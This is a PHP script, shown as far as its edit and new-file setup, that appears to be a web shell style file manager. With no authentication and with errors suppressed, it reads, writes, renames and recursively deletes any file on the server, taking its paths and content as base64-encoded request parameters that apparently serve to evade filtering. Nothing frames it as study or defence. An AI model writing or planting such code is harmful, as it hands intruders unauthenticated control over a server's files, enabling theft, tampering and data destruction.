<?php
error_reporting(0);
$root = isset($_GET['dir']) ? realpath(base64_decode($_GET['dir'])) : getcwd();
if(!$root) $root = getcwd();
$action = isset($_GET['a']) ? $_GET['a'] : 'browse';

if($action === 'delete' && isset($_GET['target'])){
    $t = realpath(base64_decode($_GET['target']));
    if($t){
        if(is_dir($t)){
            function rDel($d){$i=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($d,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::CHILD_FIRST);
            foreach($i as $f){$f->isDir()?rmdir($f->getRealPath()):unlink($f->getRealPath());}rmdir($d);}
            rDel($t); $msg = base64_encode("Deleted: ".basename($t));
        } else {
            unlink($t); $msg = base64_encode("Deleted: ".basename($t));
        }
    }
    header("Location: ?dir=".base64_encode($root)."&msg=".urlencode($msg));die();
}
if($action === 'save' && $_SERVER['REQUEST_METHOD']==='POST'){
    $origFp = base64_decode($_POST['fp']);
    $content = base64_decode($_POST['content']);
    $newName = isset($_POST['fn']) ? base64_decode($_POST['fn']) : '';
    if($newName && $newName !== basename($origFp)){
        $newFp = dirname($origFp) . '/' . $newName;
        file_put_contents($newFp, $content);
        if(file_exists($origFp) && $origFp !== $newFp) @unlink($origFp);
        $msg = base64_encode("Saved: ".$newName);
        header("Location: ?dir=".base64_encode(dirname($newFp))."&msg=".urlencode($msg));die();
    } else {
        file_put_contents($origFp, $content);
        $msg = base64_encode("Saved: ".basename($origFp));
        header("Location: ?dir=".base64_encode(dirname($origFp))."&msg=".urlencode($msg));die();
    }
}
if($action === 'view' && isset($_GET['file'])){
    $fp = realpath(base64_decode($_GET['file']));
    if($fp){
        header("Content-Type: application/json");
        echo json_encode(array("c"=>base64_encode(file_get_contents($fp)),"f"=>base64_encode(basename($fp))));
    }
    die();
}
if($action === 'edit' && isset($_GET['file'])){
    $fp = realpath(base64_decode($_GET['file']));
    $isNew = false;
}
if($action === 'new'){
    $fp = $root . '/new_file.txt';
    $isNew = true;
}
if(($action === 'edit' || $action === 'new') && isset($fp)){
    $editContent = ($action === 'edit' && $fp) ? file_get_contents($fp) : '';
}
